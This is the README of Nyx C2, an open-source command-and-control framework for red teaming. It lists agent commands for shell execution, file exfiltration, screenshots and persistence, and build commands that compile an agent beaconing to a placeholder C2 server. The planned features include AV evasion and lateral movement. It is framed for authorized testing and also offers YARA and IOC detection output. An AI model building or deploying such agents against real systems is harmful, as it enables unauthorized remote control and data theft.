# Nyx C2

<p align="center">
  <img src="dashboard/public/logo.png" width="120" alt="Nyx Logo" />
</p>

<p align="center">
  <strong>Open-source Command & Control framework for red team operations and adversary simulation</strong>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Go-1.21+-00ADD8?style=flat&logo=go" />
  <img src="https://img.shields.io/badge/Python-3.11+-3776AB?style=flat&logo=python" />
  <img src="https://img.shields.io/badge/React-18-61DAFB?style=flat&logo=react" />
  <img src="https://img.shields.io/badge/License-MIT-green?style=flat" />
</p>

> **For authorized penetration testing, red team exercises, CTF competitions, and security education only.**

---

## Features

| Feature | Details |
|---|---|
| **Cross-platform Agent** | Single Go binary — Linux, macOS, Windows (arm64 + amd64) |
| **Real-time C2** | WebSocket-based task streaming, no polling |
| **Payload Builder** | Compile custom agents with embedded C2 URL from the dashboard |
| **JWT Auth** | Operator login, token-based session management |
| **HTTPS Support** | TLS with `--tls` flag on any port |
| **Persistence** | macOS LaunchAgent / Linux cron / Windows Registry |
| **File Transfer** | Download files from agents, upload files to agents |
| **Screenshot Viewer** | Capture agent screen — renders inline as image in Console |
| **IOC Export** | Full JSON report: IPs, hostnames, commands, file exfil, persistence flags |
| **YARA Rules** | Auto-generated detection rules for agent binary + network traffic + persistence |
| **MITRE ATT&CK** | TTPs automatically mapped from executed commands |
| **Agent Notes & Tags** | Annotate compromised hosts with custom notes and color tags |
| **Heartbeat Detection** | Agents auto-marked inactive after 5-minute silence |
| **Operator Dashboard** | React + Framer Motion UI with live agent monitoring |
| **Docker Deploy** | Single `docker compose up` deployment |

## Architecture

```
┌─────────────────────────────────────────────────┐
│                  Operator                        │
│         React Dashboard (port 3000)              │
└─────────────┬───────────────────────────────────┘
              │ HTTPS / WebSocket
┌─────────────▼───────────────────────────────────┐
│              Nyx C2 Server                       │
│         FastAPI + SQLite (port 8000/8443)        │
└─────────────┬───────────────────────────────────┘
              │ HTTPS beacon
┌─────────────▼───────────────────────────────────┐
│              Nyx Agent                           │
│    Go binary — Linux / macOS / Windows           │
└─────────────────────────────────────────────────┘
```

## Quick Start

### Option 1 — Docker (Recommended)

```bash
git clone https://github.com/omerbyrb/nyx
cd nyx
docker compose up -d
# Dashboard: http://localhost:3000
# API:       http://localhost:8000
```

### Option 2 — Manual

**C2 Server**
```bash
cd server
python3.11 -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt
python run.py                   # HTTP  :8000
python run.py --tls --port 8443 # HTTPS :8443
```

**Dashboard**
```bash
cd dashboard
npm install && npm run dev
# Open http://localhost:5173
```

**Agent** — build locally
```bash
cd agent
go build -o nyx-agent .
./nyx-agent
```

**Agent** — cross-compile
```bash
# Windows
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -X main.C2URL=http://YOUR_SERVER:8000" -o nyx-agent.exe .

# Linux
GOOS=linux GOARCH=amd64 go build -ldflags="-s -w -X main.C2URL=http://YOUR_SERVER:8000" -o nyx-agent-linux .
```

Default credentials: `operator` / `nyx2024`

---

## Agent Commands

| Command | Description |
|---|---|
| `sysinfo` | Hostname, user, OS, arch, PID, IP |
| `shell <cmd>` | Execute shell command |
| `whoami` | Current user |
| `ls [path]` | List directory |
| `cat <file>` | Read file |
| `ps` | Running processes |
| `env` | Environment variables |
| `netstat` | Active network connections |
| `ifconfig` | Network interfaces |
| `download <path>` | Exfiltrate file from agent |
| `upload <path> <b64>` | Upload file to agent |
| `screenshot` | Capture agent screen |
| `persist` | Install persistence mechanism |
| `unpersist` | Remove persistence |
| `sleep <sec>` | Set beacon interval |
| `kill` | Terminate agent |

---

## Payload Builder

Generate a compiled agent binary directly from the dashboard:

1. Navigate to **Builder** tab
2. Enter your C2 server URL
3. Select target platform
4. Configure sleep/jitter intervals
5. Click **Build Agent** — binary downloads automatically

---

## Roadmap

- [x] Cross-platform Go agent
- [x] FastAPI C2 server with SQLite
- [x] JWT operator authentication
- [x] WebSocket real-time streaming
- [x] HTTPS/TLS support
- [x] File transfer (upload/download)
- [x] Screenshot capture
- [x] Persistence (macOS/Linux/Windows)
- [x] Payload builder UI
- [x] Docker deployment
- [x] IOC export (JSON) with MITRE ATT&CK TTP mapping
- [x] YARA rule generation (binary + network + persistence)
- [x] Screenshot inline viewer in Console
- [x] Agent notes & tags
- [x] Heartbeat dead-agent detection
- [ ] Process injection module (Windows/Linux)
- [ ] Payload obfuscation / AV evasion
- [ ] Lateral movement helpers
- [ ] Multi-operator support
- [ ] DNS-over-HTTPS beacon channel

---

## Legal

This tool is intended for **authorized** penetration testing, red team exercises, CTF competitions, and security education.
Unauthorized use against systems you do not have explicit permission to test is illegal.
The author assumes no liability for misuse.

---

<p align="center">Named after Nyx — the Greek goddess of night</p>
